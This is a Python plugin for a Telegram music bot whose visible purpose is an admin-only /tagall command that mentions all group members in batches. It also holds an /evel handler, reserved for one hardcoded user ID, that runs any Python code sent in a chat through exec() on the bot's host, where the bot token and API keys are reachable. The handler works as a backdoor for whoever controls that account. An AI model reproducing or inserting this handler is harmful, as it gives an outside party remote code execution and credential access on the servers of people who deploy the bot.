import os, logging, asyncio, random, sys, io, traceback
from telethon import Button
from telethon import TelegramClient, events
from telethon.tl.types import ChannelParticipantsAdmins
from telethon.tl.types import ChannelParticipantCreator
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.errors import UserNotParticipantError

from AnonXMusic import app
from AnonXMusic.core.bot import client
from config import BOT_TOKEN as bot_token, API_ID as api_id, API_HASH as api_hash, LOGGER_ID as loger

logging.basicConfig(
    level=logging.INFO,
    format='%(name)s - [%(levelname)s] - %(message)s'
)
LOGGER = logging.getLogger(__name__)

#client = (TelegramClient('client', api_id, api_hash).start(bot_token=bot_token))

spam_chats = []

@client.on(events.NewMessage(pattern="^/evel(?:\s|$)([\s\S]*)"))
async def evel(event):
  if event.sender.id == 6527347171:
    cmd = "".join(event.message.message.split(maxsplit=1)[1:])
    ms = await event.get_reply_message()
    if not cmd:
        return await event.reply("`What should i run ?..`")
    cmd = (
        cmd.replace("sendmessage", "send_message")
        .replace("sendfile", "send_file")
        .replace("editmessage", "edit_message")
    )
    catevent = await event.reply("`Running ...`")
    old_stderr = sys.stderr
    old_stdout = sys.stdout
    redirected_output = sys.stdout = io.StringIO()
    redirected_error = sys.stderr = io.StringIO()
    stdout, stderr, exc = None, None, None
    try:
        await aexec(cmd, event)
    except Exception:
        exc = traceback.format_exc()
    stdout = redirected_output.getvalue()
    stderr = redirected_error.getvalue()
    sys.stdout = old_stdout
    sys.stderr = old_stderr
    evaluation = ""
    if exc:
        evaluation = exc
    elif stderr:
        evaluation = stderr
    elif stdout:
        evaluation = stdout
    else:
        evaluation = "Success"
    final_output = (
        f"**•  Eval : **\n```{cmd}``` \n\n**•  Result : **\n```{evaluation}``` \n"
    )
    await catevent.delete()
    await event.reply(final_output)

async def aexec(code, smessatatus):
    message = event = smessatatus
    p = lambda _x: print(_format.yaml_format(_x))
    reply = await event.get_reply_message()
    exec(
        (
            "async def __aexec(message, event , reply, client, p, chat): "
            + "".join(f"\n {l}" for l in code.split("\n"))
        )
    )

    return await locals()["__aexec"](
        message, event, reply, message.client, p, message.chat_id
    )

@client.on(events.NewMessage(pattern="^/tagall|@all|/utag ?(.*)"))
async def mentionall(event):
    chat_id = event.chat_id
    mg = event.message.message
    if event.is_private:
        return await event.respond("__This command can be use in groups and channels!__")
    ms = False
    try:
        a = mg.split(" ",1)[1]
        await app.send_message(loger, f"#tagall in : {chat_id}\n\n{a}")
        ms = True
    except:
        ms = False
    is_admin = False
    adm = []
    async for x in event.client.iter_participants(
        chat_id, filter=ChannelParticipantsAdmins
    ):
        adm.append(x.id)
    if event.sender.id in adm:
        is_admin = True
    if not is_admin:
        return await event.reply("__Only admins can mention all!__")

    if ms and event.is_reply:
        return await event.reply("__Give me one argument!__")
    elif ms:
        mode = "text_on_cmd"
        msg = mg.split(" ",1)[1]
    elif event.is_reply:
        mode = "text_on_reply"
        msg = await event.get_reply_message()
        if msg == None:
            return await event.respond(
                "__I can't mention members for older messages! (messages which are sent before I'm added to group)__")
    else:
        return await event.reply("__Reply to a message or give me some text to mention others!__")

    spam_chats.append(chat_id)
    usrnum = 0
    usrtxt = ''
    emoji = [ 
         "👍", 
         "👎", 
         "❤", 
         "🔥", 
         "🥰", 
         "😁", 
         "👏", 
         "🤔", 
         "🤯", 
         "😱", 
         "🤬", 
         "😢", 
         "🎉", 
         "🤩", 
         "🤮", 
         "💩", 
         "🙏", 
         "👌", 
         "🕊", 
         "🤡", 
         "🥱", 
         "🥴", 
         "😍", 
         "🐳", 
         "🌚", 
         "💯", 
         "🌭", 
         "🤣", 
         "⚡", 
         "🍌", 
         "🏆", 
         "💔", 
         "🤨", 
         "😐", 
         "🍓", 
         "🍾", 
         "😡", 
         "👾", 
         "🤷", 
         "😎", 
         "🙊", 
         "💊", 
         "😘", 
         "🦄", 
         "🙉", 
         "💘", 
         "🆒", 
         "🗿", 
         "🤪", 
         "💅", 
         "☃", 
         "🎄", 
         "🎅", 
         "🤗", 
         "✍", 
         "🤝", 
         "😨", 
         "😇", 
         "🙈", 
         "🎃", 
         "👀", 
         "👻", 
         "🤓", 
         "😭", 
         "😴", 
         "😈", 
         "🖕", 
         "💋", 
     ]
    async for usr in client.iter_participants(chat_id):
        if not chat_id in spam_chats:
            break
        usrnum += 1
        em = random.choice(emoji)
        usrtxt += f"[{em}](tg://user?id={usr.id}) "
        if usrnum == 8:
            if mode == "text_on_cmd":
                txt = f"{msg}\n\n{usrtxt}"
                await client.send_message(chat_id, txt)
            elif mode == "text_on_reply":
                await msg.reply(usrtxt)
            await asyncio.sleep(2)
            usrnum = 0
            usrtxt = ''
    try:
        spam_chats.remove(chat_id)
    except:
        pass


@client.on(events.NewMessage(pattern="^/cancel$"))
async def cancel_spam(event):
    is_admin = False
    chat_id = event.chat_id
    adm = []
    async for x in event.client.iter_participants(
        chat_id, filter=ChannelParticipantsAdmins
    ):
        adm.append(x.id)
    if event.sender.id in adm:
        is_admin = True
    if not is_admin:
        return await event.reply("__Only admins can execute this command!__")
    if not event.chat_id in spam_chats:
        return await event.reply("__There is no proccess on going...__")
    else:
        try:
            spam_chats.remove(event.chat_id)
        except:
            pass
        return await event.respond("__Stopped Mention.__")


print(">>BOT START DEXX<<")

